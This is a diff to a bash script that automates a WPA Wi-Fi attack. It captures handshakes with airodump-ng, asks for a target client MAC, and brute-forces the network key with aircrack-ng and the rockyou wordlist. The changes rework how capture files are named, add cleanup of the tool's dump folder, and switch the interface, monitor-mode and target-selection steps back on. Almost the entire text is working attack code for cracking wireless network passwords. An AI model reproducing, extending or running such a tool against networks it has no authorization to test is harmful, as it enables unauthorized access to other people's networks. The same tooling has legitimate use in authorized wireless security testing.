@@ -81,19 +81,13 @@ wpa_handshake() {
 	local HSHAKE
 	local CRACKPID DUMPPID
 
-	# DELETE THIS JUST FOR TESTING
-	INTERFACE="wlan0mon"
-	CH=9
-	APMAC=""
-
 	create_psk_file
-
 	
 	echo
 	echo "Attempting to capture packets on channel $CH..."
 
 	# Displays airodump-ng and captured packet info for user on channel $CH
-	x-terminal-emulator -e "airodump-ng -w crackfiles/$PSKFILE -c $CH $INTERFACE" &
+	x-terminal-emulator -e "airodump-ng -w crackfiles/${PSKFILE} -c $CH $INTERFACE" &
 	sleep 2
 
 	read -p "Enter target client MAC: " CLMAC
@@ -110,7 +104,7 @@ wpa_handshake() {
 	        sleep 3
 
 		# Attempts to obtain WPA handshake by saving to output file
-		aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap > dumpfiles/output.txt &
+		aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/$PSKFILE*.cap > dumpfiles/$PSKFILE.txt &
 		sleep 1
 
 		# Obtains PID of aircrack process above and will kill it
@@ -121,7 +115,7 @@ wpa_handshake() {
 		fi
 
 		# If HSHAKE is not null, then WPA handshake was not found
-		HSHAKE=$(grep "No valid WPA handshakes found" dumpfiles/output.txt)
+		HSHAKE=$(grep "No valid WPA handshakes found" dumpfiles/$PSKFILE.txt)
 		if [ -n "$HSHAKE" ]
 		then
 			echo
@@ -141,21 +135,40 @@ wpa_handshake() {
 
 # Prompts user to enter file name for psk file
 create_psk_file() {
+
 	read -p "Enter file name for psk: " PSKFILE
 
-	#Now check if any files have the same name: FIX THIS
 	cd crackfiles
-	CRACKFILES=(*)
+	LASTFILE=`ls | tail -n 1`
 
-	for FILE in "${CRACKFILES[@]}"
-	do
-		if [ "$FILE" == "$PSKFILE" ]
-		then
-			echo File name taken!
-			read -p "Enter file name for psk: " PSKFILE
-		fi
-	done
-	
+	if [ ! -z "$LASTFILE" ]
+	then 
+		CRACKFILES=(*)
+
+		is_invalid=true
+		
+		while [[ "$is_invalid" = true ]]
+		do
+			for FILE in "${CRACKFILES[@]}"	
+			do
+				
+				if [[ "$FILE" = *"$PSKFILE"* ]]
+				then
+					echo Invalid file name!
+					read -p "Enter file name for psk: " PSKFILE
+					break
+				fi
+			done
+
+			if [[ "$FILE" = "$LASTFILE" ]]
+			then
+				echo Valid file name!
+				is_invalid=false
+			fi	
+		
+		done
+	fi
+		
 	echo Creating psk file named: $PSKFILE
 	cd ..
 }
@@ -189,7 +202,7 @@ wordlist_crack() {
 	sleep 1
 	cd ..
 
-	x-terminal-emulator -e "aircrack-ng -w wordlists/$WORDLIST -b $APMAC crackfiles/psk*.cap ; bash" &
+	x-terminal-emulator -e "aircrack-ng -w wordlists/$WORDLIST -b $APMAC crackfiles/"$PSKFILE"*.cap ; bash" &
 	echo 
 		
 	#Prompts user to exit aircrack by pressing enter
@@ -251,16 +264,20 @@ end_attack() {
 
 	sleep 1
 	echo Wordlist attack has ended.
+
+	# Cleans dumpfiles folder
+	rm dumpfiles/*
+	echo Removing dump files
+
 }
 
 #-------------------------------#
 #	MAIN EXECUTION		#
 #-------------------------------#
 
-#obtain_interface
-#monitor_mode
-#obtain_ap
-#obtain_channel
+obtain_interface
+monitor_mode
+obtain_ap
+obtain_channel
 wpa_handshake
-#ADD AN OPTION TO INCLUDE NAME OF PSK FILE
 wordlist_crack
